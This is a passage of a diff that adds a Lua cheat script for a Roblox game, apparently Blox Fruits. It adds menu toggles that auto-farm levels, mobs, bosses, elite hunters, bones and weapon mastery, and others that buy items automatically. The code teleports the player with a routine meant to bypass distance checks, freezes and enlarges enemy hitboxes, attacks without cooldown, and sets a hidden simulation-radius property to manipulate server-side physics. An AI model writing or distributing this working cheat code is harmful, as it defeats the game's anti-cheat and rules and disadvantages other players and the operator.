+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest);
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameMon.Position).Magnitude > 1500 then
+							BTP(CFrameMon);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameMon.Position).Magnitude < 1500 then
+							TP1(CFrameMon);
+						end;
+					else
+						TP1(CFrameMon);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == Mon then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
+										repeat
+											task.wait(_G.FastAttackDelay);
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											PosMon = v.HumanoidRootPart.CFrame;
+											TP1(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											StartBring = true;
+											MonFarm = v.Name;
+											AttackNoCD();
+										until not _G.AutoFarm or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+									end;
+								end;
+							end;
+						end;
+					else
+						TP1(CFrameMon);
+						UnEquipWeapon(_G.SelectWeapon);
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+if World1 then
+	MainTab:Toggle("Auto Farm Fast", _G.AutoFarmFast, "Farm Sky Lv.10-75", function(value)
+		_G.Farmfast = value;
+		StopTween(_G.Farmfast);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.Farmfast and World1 then
+					if game.Players.LocalPlayer.Data.Level.Value >= 10 then
+						_G.AutoFarm = false;
+						_G.Farmfast = true;
+					end;
+				end;
+			end;
+		end);
+	end);
+	spawn(function()
+		while wait() do
+			if _G.Farmfast and World1 then
+				pcall(function()
+					if game.Players.LocalPlayer.Data.Level.Value >= 10 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047));
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Shanda" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										v.HumanoidRootPart.Size = Vector3.new(80, 80, 80);
+										TP1(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+									until not _G.Farmfast or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+									TP1(CFrame.new(-7678.48974609375, 5566.40380859375, -497.2156066894531));
+									UnEquipWeapon(_G.SelectWeapon);
+								end;
+							end;
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.Farmfast and World1 then
+					if game.Players.LocalPlayer.Data.Level.Value >= 75 then
+						_G.AutoFarm = true;
+						_G.Farmfast = false;
+					end;
+				end;
+			end;
+		end);
+	end);
+end;
+spawn(function()
+	while wait() do
+		if _G.BuyAllSword then
+			pcall(function()
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Cutlass");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Katana");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Duel Katana");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Pipe");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Bisento");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane");
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if _G.BuyAllAib then
+			pcall(function()
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KenTalk", "Buy");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Geppo");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Buso");
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Soru");
+			end);
+		end;
+	end;
+end);
+
+
+MainTab:Seperator("Mastery Farm");
+local MasteryMode = {
+	"Level Farm",
+	"Nearest"
+};
+local SelectedMasteryMode = "Level Farm";
+MainTab:Dropdown("Select Mode", MasteryMode, SelectedMasteryMode, function(value)
+	SelectedMasteryMode = value;
+end);
+MainTab:Toggle("Auto Farm Fruit Mastery", _G.AutoFarmFruitMastery, "Auto Kill Mob Using Fruit", function(value)
+	_G.AutoFarmFruitMastery = value;
+	StopTween(_G.AutoFarmFruitMastery);
+end);
+MainTab:Toggle("Auto Farm Gun Mastery", _G.AutoFarmGunMastery, "Auto Kill Mob Using Gun", function(value)
+	_G.AutoFarmGunMastery = value;
+	StopTween(_G.AutoFarmGunMastery);
+end);
+
+spawn(function()
+	while wait() do
+		if SelectedMasteryMode == "Nearest" and _G.AutoFarmFruitMastery then
+			pcall(function()
+				for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+					if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+						if v.Name then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 5000 then
+								repeat
+									wait();
+									HealthMs = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+									if v.Humanoid.Health <= HealthMs then
+										EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+										UseSkill = true;
+										Skillaimbot = true;
+										topos(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+									else
+										UseSkill = false;
+										Skillaimbot = false;
+										EquipWeapon(_G.SelectWeapon);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+									end;
+									StartBring = true;
+									NormalAttack();
+									AutoHaki();
+									v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+									v.HumanoidRootPart.Transparency = 1;
+									v.HumanoidRootPart.CanCollide = false;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+								until not _G.AutoFarmGunMastery or (not v.Parent) or v.Humanoid.Health <= 0 or (not game.Workspace.Enemies:FindFirstChild(v.Name));
+								StartBring = false;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+
+spawn(function()
+	while wait() do
+		if SelectedMasteryMode == "Nearest" and _G.AutoFarmGunMastery then
+			pcall(function()
+				for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+					if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+						if v.Name then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 5000 then
+								repeat
+									wait();
+									HealthMin = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+									ShootPosition = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, (-15), 0);
+									if v.Humanoid.Health <= HealthMin then
+										EquipWeapon(SelectWeaponGun);
+										topos(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+										((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer("TAP", Vector3.new(ShootPosition.Position));
+										UseGunSkill = true;
+										Skillaimbot = true;
+									else
+										EquipWeapon(_G.SelectWeapon);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										UseGunSkill = false;
+										Skillaimbot = false;
+									end;
+									StartBring = true;
+									NormalAttack();
+									AutoHaki();
+									v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+									v.HumanoidRootPart.Transparency = 1;
+									v.HumanoidRootPart.CanCollide = false;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+								until not _G.AutoFarmGunMastery or (not v.Parent) or v.Humanoid.Health <= 0 or (not game.Workspace.Enemies:FindFirstChild(v.Name));
+								StartBring = false;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+
+
+if World1 then
+	tableMon = {
+		"Bandit",
+		"Monkey",
+		"Gorilla",
+		"Pirate",
+		"Brute",
+		"Desert Bandit",
+		"Desert Officer",
+		"Snow Bandit",
+		"Snowman",
+		"Chief Petty Officer",
+		"Sky Bandit",
+		"Dark Master",
+		"Toga Warrior",
+		"Gladiator",
+		"Military Soldier",
+		"Military Spy",
+		"Fishman Warrior",
+		"Fishman Commando",
+		"God's Guard",
+		"Shanda",
+		"Royal Squad",
+		"Royal Soldier",
+		"Galley Pirate",
+		"Galley Captain"
+	};
+elseif World2 then
+	tableMon = {
+		"Raider",
+		"Mercenary",
+		"Swan Pirate",
+		"Factory Staff",
+		"Marine Lieutenant",
+		"Marine Captain",
+		"Zombie",
+		"Vampire",
+		"Snow Trooper",
+		"Winter Warrior",
+		"Lab Subordinate",
+		"Horned Warrior",
+		"Magma Ninja",
+		"Lava Pirate",
+		"Ship Deckhand",
+		"Ship Engineer",
+		"Ship Steward",
+		"Ship Officer",
+		"Arctic Warrior",
+		"Snow Lurker",
+		"Sea Soldier",
+		"Water Fighter"
+	};
+elseif World3 then
+	tableMon = {
+		"Pirate Millionaire",
+		"Dragon Crew Warrior",
+		"Dragon Crew Archer",
+		"Female Islander",
+		"Giant Islander",
+		"Marine Commodore",
+		"Marine Rear Admiral",
+		"Fishman Raider",
+		"Fishman Captain",
+		"Forest Pirate",
+		"Mythological Pirate",
+		"Jungle Pirate",
+		"Musketeer Pirate",
+		"Reborn Skeleton",
+		"Living Zombie",
+		"Demonic Soul",
+		"Posessed Mummy",
+		"Peanut Scout",
+		"Peanut President",
+		"Ice Cream Chef",
+		"Ice Cream Commander",
+		"Cookie Crafter",
+		"Cake Guard",
+		"Baking Staff",
+		"Head Baker",
+		"Cocoa Warrior",
+		"Chocolate Bar Battler",
+		"Sweet Thief",
+		"Candy Rebel",
+		"Candy Pirate",
+		"Snow Demon",
+		"Isle Outlaw",
+		"Island Boy",
+		"Sun-kissed Warrior",
+		"Isle Champion"
+	};
+end;
+MainTab:Seperator("Mob Farm");
+MainTab:Dropdown("Select Mob", tableMon, false, function(vu)
+	_G.SelectMob = vu;
+end);
+MainTab:Toggle("Auto Farm Mob", _G.AutoFarmMob, "Auto Kill Mob", function(value)
+	_G.AutoFarmMob = value;
+	StopTween(_G.AutoFarmMob);
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoFarmMob then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild(_G.SelectMob) then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == _G.SelectMob then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									StartBring = true;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									v.HumanoidRootPart.Size = Vector3.new(80, 80, 80);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.AutoFarmMob or (not v.Parent) or v.Humanoid.Health <= 0;
+								StartBring = false;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Seperator("Boss Farm");
+local BossLabel = MainTab:Label("Status : Select Boss");
+spawn(function()
+	while wait() do
+		pcall(function()
+			if (game:GetService("ReplicatedStorage")):FindFirstChild(_G.SelectBoss) or (game:GetService("Workspace")).Enemies:FindFirstChild(_G.SelectBoss) then
+				BossLabel:Set("Status : Spawn!");
+			else
+				BossLabel:Set("Status : Boss Not Spawn");
+			end;
+		end);
+	end;
+end);
+if World1 then
+	tableBoss = {
+		"The Gorilla King",
+		"Bobby",
+		"Yeti",
+		"Mob Leader",
+		"Vice Admiral",
+		"Warden",
+		"Chief Warden",
+		"Swan",
+		"Magma Admiral",
+		"Fishman Lord",
+		"Wysper",
+		"Thunder God",
+		"Cyborg",
+		"Saber Expert"
+	};
+elseif World2 then
+	tableBoss = {
+		"Diamond",
+		"Jeremy",
+		"Fajita",
+		"Don Swan",
+		"Smoke Admiral",
+		"Cursed Captain",
+		"Darkbeard",
+		"Order",
+		"Awakened Ice Admiral",
+		"Tide Keeper"
+	};
+elseif World3 then
+	tableBoss = {
+		"Stone",
+		"Island Empress",
+		"Kilo Admiral",
+		"Captain Elephant",
+		"Beautiful Pirate",
+		"rip_indra True Form",
+		"Longma",
+		"Soul Reaper",
+		"Cake Queen"
+	};
+end;
+MainTab:Dropdown("Select Boss", tableBoss, false, function(value)
+	_G.SelectBoss = value;
+end);
+MainTab:Toggle("Auto Farm Boss", _G.AutoFarmBoss, "Auto Kill Selected Boss", function(value)
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+	_G.AutoFarmBoss = value;
+	StopTween(_G.AutoFarmBoss);
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoFarmBoss then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild(_G.SelectBoss) then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == _G.SelectBoss then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(80, 80, 80);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+									sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+								until not _G.AutoFarmBoss or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				elseif (game:GetService("ReplicatedStorage")):FindFirstChild(_G.SelectBoss) then
+					topos(((game:GetService("ReplicatedStorage")):FindFirstChild(_G.SelectBoss)).HumanoidRootPart.CFrame * CFrame.new(5, 10, 2));
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Farm All Boss", _G.AutoFarmAllBoss, "Auto Kill All Boss", function(value)
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+	_G.AutoFarmAllBoss = value;
+	StopTween(_G.AutoFarmAllBoss);
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoFarmAllBoss then
+			pcall(function()
+				for i, boss in pairs(tableBoss) do
+					if (game:GetService("Workspace")).Enemies:FindFirstChild(boss) then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == boss then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.HumanoidRootPart.Size = Vector3.new(80, 80, 80);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+										sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+									until not _G.AutoFarmAllBoss or (not v.Parent) or v.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					elseif (game:GetService("ReplicatedStorage")):FindFirstChild(boss) then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild(boss)).HumanoidRootPart.CFrame * CFrame.new(5, 10, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Seperator("Elite Hunter");
+local Elite_Hunter_Status = MainTab:Label("Status");
+spawn(function()
+	while wait() do
+		pcall(function()
+			if (game:GetService("ReplicatedStorage")):FindFirstChild("Diablo") or (game:GetService("ReplicatedStorage")):FindFirstChild("Deandre") or (game:GetService("ReplicatedStorage")):FindFirstChild("Urban") or (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+				Elite_Hunter_Status:Set("Status : Elite Spawn!");
+			else
+				Elite_Hunter_Status:Set("Status : Elite Not Spawn");
+			end;
+		end);
+	end;
+end);
+MainTab:Toggle("Auto Elite Hunter", _G.AutoElitehunter, "Auto Kill Elite Hunter When Spawn", function(value)
+	_G.AutoElitehunter = value;
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+	StopTween(_G.AutoElitehunter);
+end);
+MainTab:Button("Check Progress", function()
+	Alert:create("Elite Hunter Progress : " .. (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter", "Progress"));
+end);
+local Elite = CFrame.new(-5418.892578125, 313.74130249023, -2826.2260742188);
+spawn(function()
+	while wait() do
+		if _G.AutoElitehunter and World3 then
+			pcall(function()
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Elite.Position).Magnitude > 1500 then
+							BTP(Elite);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Elite.Position).Magnitude < 1500 then
+							topos(Elite);
+						end;
+					else
+						topos(Elite);
+					end;
+					if (Vector3.new((-5418.892578125), 313.74130249023, (-2826.2260742188)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter");
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if string.find(QuestTitle, "Diablo") or string.find(QuestTitle, "Deandre") or string.find(QuestTitle, "Urban") then
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
+									if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+										repeat
+											task.wait(_G.FastAttackDelay);
+											AutoHaki();
+											EquipWeapon(_G.SelectWeapon);
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											AttackNoCD();
+										until _G.AutoElitehunter == false or v.Humanoid.Health <= 0 or (not v.Parent);
+									end;
+								end;
+							end;
+						elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Diablo") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Diablo")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Deandre") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Deandre")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Urban") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Urban")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Seperator("Bone Farm");
+local ListB = {
+	"No Quest",
+	"Quest",
+	"MasteryFruit",
+	"MasteryGun"
+};
+BoneFMode = "No Quest";
+MainTab:Dropdown("Select Mode", ListB, BoneFMode, function(value)
+	BoneFMode = value;
+end);
+local BoneFarm = MainTab:Toggle("Auto Farm Bone", _G.Auto_Bone, "Auto Kill Bone Mob", function(value)
+	_G.Auto_Bone = value;
+	StopTween(_G.Auto_Bone);
+end);
+local BonePos = CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375);
+spawn(function()
+	while wait() do
+		if BoneFMode == "No Quest" and _G.Auto_Bone and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+					StartBring = false;
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.Head.CanCollide = false;
+									StartBring = true;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Auto_Bone or (not v.Parent) or v.Humanoid.Health <= 0;
+								StartBring = false;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BonePos.Position).Magnitude > 1500 then
+							BTP(BonePos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BonePos.Position).Magnitude < 1500 then
+							topos(BonePos);
+						end;
+					else
+						topos(BonePos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375));
+				end;
+			end);
+		end;
+	end;
+end);
+local BoneQuestPos = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+spawn(function()
+	while wait() do
+		if BoneFMode == "Quest" and _G.Auto_Bone and World3 then
+			pcall(function()
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, "Demonic Soul") then
+					StartBring = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					StartBring = false;
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude > 1500 then
+							BTP(BoneQuestPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude < 1500 then
+							topos(BoneQuestPos);
+						end;
+					else
+						topos(BoneQuestPos);
+					end;
+					if (BoneQuestPos.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 1);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Demonic Soul") then
+										repeat
+											task.wait(_G.FastAttackDelay);
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											StartBring = true;
+											AttackNoCD();
+										until not _G.Auto_Bone or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+									end;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if BoneFMode == "MasteryFruit" and _G.Auto_Bone and World3 then
+			pcall(function()
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, "Demonic Soul") then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude > 1500 then
+							BTP(BoneQuestPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude < 1500 then
+							topos(BoneQuestPos);
+						end;
+					else
+						topos(BoneQuestPos);
+					end;
+					if (BoneQuestPos.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 1);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Demonic Soul") then
+										HealthMs = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+										repeat
+											task.wait();
+											if v.Humanoid.Health <= HealthMs then
+												EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+												TP1(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+												UseSkill = true;
+												Skillaimbot = true;
+											else
+												UseSkill = false;
+												Skillaimbot = false;
+												EquipWeapon(_G.SelectWeapon);
+												TP1(v.HumanoidRootPart.CFrame * Pos);
+											end;
+											PosMon = v.HumanoidRootPart.CFrame;
+											AimBotSkillPosition = PosMon.Position;
+											MonFarm = v.Name;
+											StartBring = true;
+											AutoHaki();
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											NormalAttack();
+										until not _G.Auto_Bone or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+										Skillaimbot = false;
+										UseSkill = false;
+									end;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if BoneFMode == "MasteryGun" and _G.Auto_Bone and World3 then
+			pcall(function()
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, "Demonic Soul") then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
